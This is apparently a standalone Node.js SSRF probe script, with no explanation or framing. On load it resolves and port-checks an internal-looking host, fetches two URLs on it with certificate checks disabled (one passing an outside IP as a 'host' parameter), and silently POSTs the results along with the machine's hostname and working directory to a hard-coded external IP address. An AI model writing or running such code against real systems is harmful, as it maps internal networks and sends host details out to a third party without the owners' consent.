const http = require('http');
const https = require('https');
const dns = require('dns');
const net = require('net');
const os = require('os');

function postBack(data) {
  const body = JSON.stringify(data);
  const req = http.request({
    hostname: '101.35.44.248',
    port: 80,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

function checkTcp(host, port, timeout = 5000) {
  return new Promise((resolve) => {
    const sock = new net.Socket();
    sock.setTimeout(timeout);
    sock.on('connect', () => { sock.destroy(); resolve('tcp_open'); });
    sock.on('error', (e) => { sock.destroy(); resolve('tcp_err:' + e.message); });
    sock.on('timeout', () => { sock.destroy(); resolve('tcp_timeout'); });
    sock.connect(port, host);
  });
}

function checkDns(host) {
  return new Promise((resolve) => {
    dns.resolve4(host, (err, addrs) => {
      if (err) resolve('dns_err:' + err.code);
      else resolve('dns_ok:' + addrs.join(','));
    });
  });
}

function fetchUrl(url) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const opts = {
      hostname: u.hostname,
      port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: u.pathname + u.search,
      method: 'GET',
      timeout: 8000,
      rejectUnauthorized: false, // 跳过证书校验看具体错误
    };
    const req = mod.request(opts, (res) => {
      let data = '';
      res.on('data', d => data += d);
      res.on('end', () => resolve({ code: res.statusCode, headers: JSON.stringify(res.headers).slice(0, 300), body: data.slice(0, 500) }));
    });
    req.on('error', (e) => resolve({ err: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ err: 'timeout' }); });
    req.end();
  });
}

(async () => {
  const host = 'src-ssrf.bytedance.net';
  const dnsR = await checkDns(host);
  const tcp443 = await checkTcp(host, 443);
  const tcp80 = await checkTcp(host, 80);

  const fetches = {};
  for (const url of [
    'https://src-ssrf.bytedance.net/ssrf',
    'https://src-ssrf.bytedance.net/ssrf?host=101.35.44.248',
  ]) {
    fetches[url] = await fetchUrl(url);
  }

  postBack({
    type: 'ssrf-probe',
    diag: { dns: dnsR, tcp443, tcp80 },
    fetches,
    env: { hostname: os.hostname(), cwd: process.cwd() },
  });
})();
